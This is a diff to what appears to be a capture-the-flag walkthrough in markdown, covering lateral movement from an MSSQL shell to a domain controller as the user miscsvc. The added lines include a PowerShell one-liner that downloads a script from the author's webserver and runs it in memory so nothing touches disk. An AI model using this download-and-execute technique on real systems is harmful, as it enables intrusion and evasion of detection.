@@ -148,9 +148,13 @@ Invoke-Command -Computername DC1 -Credential $Credential -Scriptblock { whoami }
 ```
 replacing `whoami` with whatever command I want to execute as `miscsvc`
 
-From the MSSQL:
-<img src="Images/command.png" width=600>
+From the MSSQLshell I'll use the command:
+`powershell Invoke-Expression(Invoke-WebRequest http://10.10.14.43/command.ps1 -UseBasicParsing)` which will retrieve the file from my webserver and `Invoke-Expression` will execute the command immediately in memory so nothing touches disk.
 
-and on the webserver I get a hit
+On the webserver I get a hit
 
 <img src="Images/server.png" width=400>
+
+which returns the result of `whoami` as `scrm`miscsvc`
+
+<img src="Images/command.png" width=600>
